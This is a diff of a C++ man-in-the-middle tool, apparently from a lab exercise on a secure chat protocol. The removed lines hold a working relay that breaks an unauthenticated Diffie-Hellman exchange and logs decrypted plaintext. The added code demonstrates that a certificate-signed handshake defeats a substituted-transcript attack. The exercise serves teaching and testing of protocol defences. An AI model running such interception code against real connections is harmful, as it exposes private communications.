@@ -1,16 +1,14 @@
 #include <arpa/inet.h>
-#include <cerrno>
-#include <cctype>
 #include <cstdint>
 #include <cstdlib>
 #include <iostream>
 #include <netinet/in.h>
-#include <poll.h>
 #include <string>
 #include <sys/socket.h>
 #include <unistd.h>
 
 #include "key_exchange.h"
+#include "pki.h"
 #include "secure_channel.h"
 #include "socket_io.h"
 
@@ -63,139 +61,44 @@ int create_listener(const std::string &ip, std::uint16_t port) {
   return fd;
 }
 
-bool exchange_as_server(int victim_fd, SessionKey &victim_key) {
-  Message victim_public_message(MessageType::DH_PUBLIC_KEY, "");
-  if (!receive_message(victim_fd, victim_public_message) ||
-      victim_public_message.type() != MessageType::DH_PUBLIC_KEY)
+// Phase 3 attack attempt. Mallory forwards the genuine certificate, then
+// substitutes a different client DH transcript toward the real server. The
+// real server signs Mallory's transcript; forwarding that signature to the
+// victim must fail because the victim verifies its own transcript.
+bool attempt_authenticated_mitm(int victim_fd, int server_fd) {
+  Message certificate(MessageType::SERVER_CERTIFICATE, "");
+  if (!receive_message(server_fd, certificate) ||
+      certificate.type() != MessageType::SERVER_CERTIFICATE ||
+      !send_message(victim_fd, certificate))
     return false;
 
-  try {
-    const Number victim_public =
-        dh_decode_public_key(victim_public_message.payload_as_string());
-    const DhKeyPair mallory_keys = dh_generate_key_pair();
-    if (!send_message(victim_fd,
-                      Message(MessageType::DH_PUBLIC_KEY,
-                              dh_encode_public_key(
-                                  mallory_keys.public_key))))
-      return false;
-
-    const Number shared_secret =
-        dh_shared_secret(victim_public, mallory_keys.private_key);
-    return derive_session_key(shared_secret, victim_key);
-  } catch (const std::exception &error) {
-    std::cerr << "[MITM] victim-side DH failed: " << error.what() << '\n';
-    return false;
-  }
-}
-
-bool exchange_as_client(int server_fd, SessionKey &server_key) {
-  try {
-    const DhKeyPair mallory_keys = dh_generate_key_pair();
-    if (!send_message(server_fd,
-                      Message(MessageType::DH_PUBLIC_KEY,
-                              dh_encode_public_key(
-                                  mallory_keys.public_key))))
-      return false;
-
-    Message server_public_message(MessageType::DH_PUBLIC_KEY, "");
-    if (!receive_message(server_fd, server_public_message) ||
-        server_public_message.type() != MessageType::DH_PUBLIC_KEY)
-      return false;
-
-    const Number server_public =
-        dh_decode_public_key(server_public_message.payload_as_string());
-    const Number shared_secret =
-        dh_shared_secret(server_public, mallory_keys.private_key);
-    return derive_session_key(shared_secret, server_key);
-  } catch (const std::exception &error) {
-    std::cerr << "[MITM] server-side DH failed: " << error.what() << '\n';
-    return false;
-  }
-}
-
-const char *message_type_name(MessageType type) {
-  switch (type) {
-  case MessageType::CLIENT_HELLO:
-    return "CLIENT_HELLO";
-  case MessageType::SERVER_RESPONSE:
-    return "SERVER_RESPONSE";
-  case MessageType::CHAT_MESSAGE:
-    return "CHAT_MESSAGE";
-  case MessageType::LOGIN_ACCEPTED:
-    return "LOGIN_ACCEPTED";
-  case MessageType::LOGIN_REJECTED:
-    return "LOGIN_REJECTED";
-  case MessageType::DIRECT_MESSAGE:
-    return "DIRECT_MESSAGE";
-  case MessageType::WHO_REQUEST:
-    return "WHO_REQUEST";
-  case MessageType::WHO_RESPONSE:
-    return "WHO_RESPONSE";
-  case MessageType::SERVER_ERROR:
-    return "SERVER_ERROR";
-  case MessageType::DH_PUBLIC_KEY:
-    return "DH_PUBLIC_KEY";
-  case MessageType::ENCRYPTED_MESSAGE:
-    return "ENCRYPTED_MESSAGE";
-  case MessageType::COUNT:
-    break;
-  }
-  return "UNKNOWN";
-}
-
-std::string escaped_payload(const Message &message) {
-  const std::string payload = message.payload_as_string();
-  std::string escaped;
-  for (unsigned char byte : payload) {
-    if (byte == '\n')
-      escaped += "\\n";
-    else if (byte == '\r')
-      escaped += "\\r";
-    else if (byte == '\t')
-      escaped += "\\t";
-    else if (std::isprint(byte))
-      escaped += static_cast<char>(byte);
-    else
-      escaped += '?';
-  }
-  return escaped;
-}
-
-bool relay_one(int source_fd, const SessionKey &source_key, int destination_fd,
-               const SessionKey &destination_key, const char *direction) {
-  Message plaintext(MessageType::SERVER_ERROR, "");
-  if (!receive_secure_message(source_fd, plaintext, source_key))
+  Message victim_key(MessageType::CLIENT_KEY_EXCHANGE, "");
+  if (!receive_message(victim_fd, victim_key) ||
+      victim_key.type() != MessageType::CLIENT_KEY_EXCHANGE)
     return false;
 
-  std::cout << "[PLAINTEXT " << direction << "] "
-            << message_type_name(plaintext.type()) << " payload=\""
-            << escaped_payload(plaintext) << "\"" << std::endl;
-  return send_secure_message(destination_fd, plaintext, destination_key);
-}
+  std::vector<std::uint8_t> challenge;
+  if (!random_bytes(32, challenge))
+    return false;
+  const DhKeyPair mallory_keys = dh_generate_key_pair();
+  const std::string mallory_payload =
+      hex_encode(challenge) + "\n" +
+      dh_encode_public_key(mallory_keys.public_key);
+  if (!send_message(server_fd,
+                    Message(MessageType::CLIENT_KEY_EXCHANGE,
+                            mallory_payload)))
+    return false;
 
-void relay_connection(int victim_fd, int server_fd,
-                      const SessionKey &victim_key,
-                      const SessionKey &server_key) {
-  pollfd sockets[2] = {{victim_fd, POLLIN, 0}, {server_fd, POLLIN, 0}};
-  while (true) {
-    const int result = poll(sockets, 2, -1);
-    if (result < 0 && errno == EINTR)
-      continue;
-    if (result <= 0)
-      return;
+  Message server_response(MessageType::SERVER_KEY_EXCHANGE, "");
+  if (!receive_message(server_fd, server_response) ||
+      server_response.type() != MessageType::SERVER_KEY_EXCHANGE ||
+      !send_message(victim_fd, server_response))
+    return false;
 
-    if ((sockets[0].revents & POLLIN) &&
-        !relay_one(victim_fd, victim_key, server_fd, server_key,
-                   "client -> server"))
-      return;
-    if ((sockets[1].revents & POLLIN) &&
-        !relay_one(server_fd, server_key, victim_fd, victim_key,
-                   "server -> client"))
-      return;
-    if ((sockets[0].revents | sockets[1].revents) &
-        (POLLERR | POLLHUP | POLLNVAL))
-      return;
-  }
+  std::cout << "[MITM] forwarded server signature for a substituted DH "
+               "transcript; victim should reject it"
+            << std::endl;
+  return true;
 }
 
 } // namespace
@@ -237,13 +140,7 @@ int main(int argc, char *argv[]) {
       continue;
     }
 
-    SessionKey victim_key{};
-    SessionKey server_key{};
-    if (exchange_as_server(victim_fd, victim_key) &&
-        exchange_as_client(server_fd, server_key)) {
-      std::cout << "[MITM] established two independent secure channels\n";
-      relay_connection(victim_fd, server_fd, victim_key, server_key);
-    } else {
+    if (!attempt_authenticated_mitm(victim_fd, server_fd)) {
       std::cerr << "[MITM] key exchange failed\n";
     }
 
@@ -254,4 +151,3 @@ int main(int argc, char *argv[]) {
     std::cout << "[MITM] connection closed\n";
   }
 }
-
